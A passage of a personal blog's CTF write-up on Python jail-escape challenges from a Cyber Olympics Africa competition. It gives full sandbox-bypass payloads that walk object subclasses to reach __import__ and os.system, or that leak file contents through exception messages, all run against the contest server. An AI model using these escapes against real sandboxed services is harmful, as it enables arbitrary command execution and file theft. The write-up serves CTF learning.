&lt;type &#39;formatteriterator&#39;&gt;, &lt;type &#39;sys.version_info&#39;&gt;, &lt;type &#39;sys.flags&#39;&gt;, &lt;type &#39;exceptions.BaseException&#39;&gt;, &lt;type &#39;module&#39;&gt;, &lt;type &#39;imp.NullImporter&#39;&gt;, &lt;type &#39;zipimport.zipimporter&#39;&gt;, &lt;type &#39;posix.stat_result&#39;&gt;, &lt;type &#39;posix.statvfs_result&#39;&gt;, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &lt;class &#39;_abcoll.Hashable&#39;&gt;, &lt;type &#39;classmethod&#39;&gt;, &lt;class &#39;_abcoll.Iterable&#39;&gt;, &lt;class &#39;_abcoll.Sized&#39;&gt;, &lt;class &#39;_abcoll.Container&#39;&gt;, &lt;class &#39;_abcoll.Callable&#39;&gt;, &lt;type &#39;dict_keys&#39;&gt;, &lt;type &#39;dict_items&#39;&gt;, &lt;type &#39;dict_values&#39;&gt;, &lt;class &#39;site._Printer&#39;&gt;, &lt;class &#39;site._Helper&#39;&gt;, &lt;type &#39;_sre.SRE_Pattern&#39;&gt;, &lt;type &#39;_sre.SRE_Match&#39;&gt;, &lt;type &#39;_sre.SRE_Scanner&#39;&gt;, &lt;class &#39;site.Quitter&#39;&gt;, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;]
</code></pre><p>there interesting thing is <code>&lt;type 'file'></code></p><p>using this <code>file</code> object</p><pre tabindex=0><code>malwarepeter@spaceX:~$  nc 16.16.65.31 31000
Initializing Playground...
.......
.......

Welcome to the Cyberlympic Phase2 jail! Type your commands below:
But remember, your code will be closely watched!
&gt;&gt;&gt; print(().__class__.__bases__[0].__subclasses__()[40])
&lt;type &#39;file&#39;&gt;
&gt;&gt;&gt; print(().__class__.__bases__[0].__subclasses__()[40](&#34;/etc/passwd&#34;).read())
Oops! Something unexpected happened: file() constructor not accessible in restricted mode
&gt;&gt;&gt;
</code></pre><p>we got an error, after looking around there class called, <code>warnings.catch_warnings'</code> which is located in index 59</p><p>applying <code>_module</code> attribute</p><pre tabindex=0><code>&gt;&gt;&gt; print(dir(().__class__.__base__.__subclasses__()[59]()._module))
[&#39;WarningMessage&#39;, &#39;_OptionError&#39;, &#39;__all__&#39;, &#39;__builtins__&#39;, &#39;__doc__&#39;, &#39;__file__&#39;, &#39;__name__&#39;, &#39;__package__&#39;, &#39;_getaction&#39;, &#39;_getcategory&#39;, &#39;_processoptions&#39;, &#39;_setoption&#39;, &#39;_show_warning&#39;, &#39;catch_warnings&#39;, &#39;default_action&#39;, &#39;defaultaction&#39;, &#39;filters&#39;, &#39;filterwarnings&#39;, &#39;formatwarning&#39;, &#39;linecache&#39;, &#39;once_registry&#39;, &#39;onceregistry&#39;, &#39;resetwarnings&#39;, &#39;showwarning&#39;, &#39;simplefilter&#39;, &#39;sys&#39;, &#39;types&#39;, &#39;warn&#39;, &#39;warn_explicit&#39;, &#39;warnpy3k&#39;]
&gt;&gt;&gt;
</code></pre><p>A very interesting attribute appears, it is “<strong>builtins</strong>”.</p><blockquote><p><strong><em>NOTE:</em></strong><br>The content of __ builtins __ is a dictionary of Python “builtins” functions containing, among other things, the <strong>import</strong> function.</p></blockquote><p>Once this function is located, all that remains is to import the <code>os</code> module which execute system commands using the <code>system</code> function of this module to obtain the flag.</p><pre tabindex=0><code>malwarepeter@spaceX:~$  nc 16.16.65.31 31000
Initializing Playground...
.......
.......

Welcome to the Cyberlympic Phase2 jail! Type your commands below:
But remember, your code will be closely watched!
&gt;&gt;&gt; print(().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__[&#39;__import__&#39;](&#39;os&#39;).system(&#39;whoami&#39;))
nobody
0
&gt;&gt;&gt;
</code></pre><p>we got it, now read the flag</p><pre tabindex=0><code>malwarepeter@spaceX:~$  nc 16.16.65.31 31000
Initializing Playground...
.......
.......

Welcome to the Cyberlympic Phase2 jail! Type your commands below:
But remember, your code will be closely watched!
&gt;&gt;&gt; print(().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__[&#39;__import__&#39;](&#39;os&#39;).system(&#39;cat flag.txt&#39;))
acdfCTF{35c4p3_pl4n_1337_w0rk3d_y35!!}
0
&gt;&gt;&gt;
</code></pre><p><img loading=lazy src=img/jail22.png alt=img22></p><p>escaped Again,</p><hr><h2 id=jail-break-3>Jail Break 3<a hidden class=anchor aria-hidden=true href=#jail-break-3>#</a></h2><p><img loading=lazy src=img/jail3.png alt=img3></p><p>well it has 500 points which is 100 addition from jail break 2. so it could be a little harder . lets see</p><h3 id=connecting-2>connecting<a hidden class=anchor aria-hidden=true href=#connecting-2>#</a></h3><pre tabindex=0><code>malwarepeter@spaceX:~$ nc 16.16.65.31 32000

  _____  _________ ________  ___________ _______________________________ _______________   ________  ________
  /  _  \ \_   ___ \\______ \ \_   _____/ \_   ___ \__    ___/\_   _____/ \_____  \   _  \  \\_____  \\_____  \
 /  /_\  \/    \  \/ |    |  \ |    __)   /    \  \/ |    |    |    __)    /  ____/  /_\  \  /  ____/   _(__  &lt;
/    |    \     \____|    `   \|     \    \     \____|    |    |     \    /       \  \_/   \/       \  /       \
\____|__  /\______  /_______  /\___  /     \______  /|____|    \___  /    \_______ \_____  /\_______ \/______  /
        \/        \/        \/     \/             \/               \/             \/     \/         \/       \/

                             Created By Abzee Saminu x Berry x Kismet

Let me tell you a secret, There is a flag here!
&gt;&gt; print(&#34;hi,lymo&#34;)
(&#34;That won&#39;t work here&#34;, &#39;print(&#34;hi,lymo&#34;)&#39;, &#39;?&#39;)
(&#39;Exception:&#39;, SyntaxError(&#39;invalid syntax&#39;, (&#39;&lt;string&gt;&#39;, 1, 7, &#39;x=print(&#34;hi,lymo&#34;)\n&#39;)))
&gt;&gt; __bultins__
(&#34;That won&#39;t work here&#34;, &#39;__bultins__&#39;, &#39;?&#39;)
(&#39;Exception:&#39;, NameError(&#34;name &#39;__bultins__&#39; is not defined&#34;,))
&gt;&gt; dir()
(&#34;That won&#39;t work here&#34;, &#39;dir()&#39;, &#39;?&#39;)
&gt;&gt;
</code></pre><h3 id=exploiting-2>exploiting<a hidden class=anchor aria-hidden=true href=#exploiting-2>#</a></h3><p>i noticed there two type of feedback we get</p><p>this when things go correct but seems there filter here</p><pre tabindex=0><code>(&#34;That won&#39;t work here&#34;, &#39;dir()&#39;, &#39;?&#39;)
</code></pre><p>and Exception feedback when thing goes wrong</p><pre tabindex=0><code>(&#39;Exception:&#39;, NameError(&#34;name &#39;__bultins__&#39; is not defined&#34;,))
</code></pre><p>now, lets try import</p><pre tabindex=0><code>malwarepeter@spaceX:~$ nc 16.16.65.31 32000
.....
.....

Let me tell you a secret, There is a flag here!
&gt;&gt; import
(&#34;That won&#39;t work here&#34;, &#39;import&#39;, &#39;?&#39;)
(&#39;Exception:&#39;, SyntaxError(&#39;invalid syntax&#39;, (&#39;&lt;string&gt;&#39;, 1, 8, &#39;x=import\n&#39;)))
&gt;&gt;
</code></pre><p>i got Exception which i know because its a syntax error
lets try</p><pre tabindex=0><code>import os
</code></pre><p>well i got new Exception message</p><pre tabindex=0><code>&gt;&gt; import os
The quieter you become, The more you are able to hear
</code></pre><p>the message tryna give us hint refer &ldquo;quieter&rdquo; by using common sense</p><p>i had to google how to escape with quit</p><p>tried</p><pre tabindex=0><code>malwarepeter@spaceX:~$ nc 16.16.65.31 32000
.....
.....

Let me tell you a secret, There is a flag here!
&gt;&gt; quit()
(&#34;That won&#39;t work here&#34;, &#39;quit()&#39;, &#39;?&#39;)
</code></pre><p>executed but the shell gone after that, that strange</p><p>now back to our basic, see if we can execute basic command for enumeration</p><pre tabindex=0><code>malwarepeter@spaceX:~$ nc 16.16.65.31 32000
...
...

Let me tell you a secret, There is a flag here!
&gt;&gt; quit(dir())
(&#34;That won&#39;t work here&#34;, &#39;quit(dir())&#39;, &#39;?&#39;)
[&#39;__builtins__&#39;, &#39;__doc__&#39;, &#39;__file__&#39;, &#39;__name__&#39;, &#39;__package__&#39;, &#39;ascii_text&#39;, &#39;blacklisted&#39;, &#39;func&#39;, &#39;x&#39;]
</code></pre><p>boom we got it, and we can <code>__builtins__</code> module and <code>__file__</code> attribute as well,</p><p>its going to be a piece of cake from here</p><p>lets try simple payload from using <code>__builtins__</code></p><pre tabindex=0><code>Let me tell you a secret, There is a flag here!
&gt;&gt; quit(__builtins__[&#39;__import__&#39;](&#39;os&#39;).system(&#39;cat flag.txt&#39;)))
The quieter you become, The more you are able to hear
malwarepeter@spaceX:~$
</code></pre><p>executed but no flag, and shell existed weird</p><p>well after some time, as you check earlier when we used correct statement but has syntax we got two Exception together</p><pre tabindex=0><code>&gt;&gt; import
(&#34;That won&#39;t work here&#34;, &#39;import&#39;, &#39;?&#39;)
(&#39;Exception:&#39;, SyntaxError(&#39;invalid syntax&#39;, (&#39;&lt;string&gt;&#39;, 1, 8, &#39;x=import\n&#39;)))
</code></pre><p>then trick is we can execute correct statement and use another function to raise the an error then since the first payload worked then the output will display on error Exception message , bingo</p><pre tabindex=0><code>malwarepeter@spaceX:~$ nc 16.16.65.31 32000
....
....

Let me tell you a secret, There is a flag here!
&gt;&gt; int(str(&#39;tanzania&#39;))
(&#34;That won&#39;t work here&#34;, &#34;int(str(&#39;tanzania&#39;))&#34;, &#39;?&#39;)
(&#39;Exception:&#39;, ValueError(&#34;invalid literal for int() with base 10: &#39;tanzania&#39;&#34;,))
&gt;&gt; 
</code></pre><p>well as you notice, only output of <code>'tanzania'</code> returned without <code>str</code> that means <code>str</code> executed but since it returned string which will raise an error to int, so output will be displayed,</p><p>we will inject payload to read <code>flag.txt</code> since result from <code>flag.txt</code> is <code>String</code> then will raise as error and flag will be displayed in error Exception of <code>int</code>
i used this payload</p><pre tabindex=0><code>quit(int(().__class__.__base__.__subclasses__()[40](&#34;flag.txt&#34;,&#34;r&#34;).read()))
</code></pre><p><img loading=lazy src=img/jail33.png alt=img33></p><p>bingo!!!, we got flag
This challenge was actually quite difficult for me, so I decided to take a break and return later with only 30 minutes left until the competition ended. It turned out to be a stroke of luck, haha!</p><p>i submitted flag when 1 sec remained</p><p><img loading=lazy src=img/final.png alt=img1></p><hr><h2 id=reference>reference<a hidden class=anchor aria-hidden=true href=#reference>#</a></h2><p><a href=https://stackoverflow.com/questions/73043035/what-is-class-base-subclasses>https://stackoverflow.com/questions/73043035/what-is-class-base-subclasses</a></p><p><a href=https://note.nkmk.me/en/python-issubclass-mro-bases-subclasses/>https://note.nkmk.me/en/python-issubclass-mro-bases-subclasses/</a></p><p><a href=https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#no-builtins>https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#no-builtins</a></p></div><footer class=post-footer><ul class=post-tags><li><a href=https://peterlymo.com/tags/ctf/>CTF</a></li><li><a href=https://peterlymo.com/tags/pyjail/>Pyjail</a></li><li><a href=https://peterlymo.com/tags/africa/>Africa</a></li></ul><nav class=paginav><a class=next href=https://peterlymo.com/posts/try-hack-me-ignite-writeup/><span class=title>Next »</span><br><span>Try Hack Me - IGNITE Writeup</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share Cyber Olympics Africa - Pyjails Writeup on twitter" href="https://twitter.com/intent/tweet/?text=Cyber%20Olympics%20Africa%20-%20Pyjails%20Writeup&amp;url=https%3a%2f%2fpeterlymo.com%2fposts%2fcyber-olympics-africa-pyjails-writeup%2f&amp;hashtags=CTF%2cPyjail%2cAfrica"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Cyber Olympics Africa - Pyjails Writeup on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fpeterlymo.com%2fposts%2fcyber-olympics-africa-pyjails-writeup%2f&amp;title=Cyber%20Olympics%20Africa%20-%20Pyjails%20Writeup&amp;summary=Cyber%20Olympics%20Africa%20-%20Pyjails%20Writeup&amp;source=https%3a%2f%2fpeterlymo.com%2fposts%2fcyber-olympics-africa-pyjails-writeup%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Cyber Olympics Africa - Pyjails Writeup on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fpeterlymo.com%2fposts%2fcyber-olympics-africa-pyjails-writeup%2f&title=Cyber%20Olympics%20Africa%20-%20Pyjails%20Writeup"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Cyber Olympics Africa - Pyjails Writeup on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fpeterlymo.com%2fposts%2fcyber-olympics-africa-pyjails-writeup%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Cyber Olympics Africa - Pyjails Writeup on whatsapp" href="https://api.whatsapp.com/send?text=Cyber%20Olympics%20Africa%20-%20Pyjails%20Writeup%20-%20https%3a%2f%2fpeterlymo.com%2fposts%2fcyber-olympics-africa-pyjails-writeup%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Cyber Olympics Africa - Pyjails Writeup on telegram" href="https://telegram.me/share/url?text=Cyber%20Olympics%20Africa%20-%20Pyjails%20Writeup&amp;url=https%3a%2f%2fpeterlymo.com%2fposts%2fcyber-olympics-africa-pyjails-writeup%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentcolor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></main><footer class=footer><span>&copy; 2023 <a href=https://peterlymo.com/>Peter Lymo's Blog</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>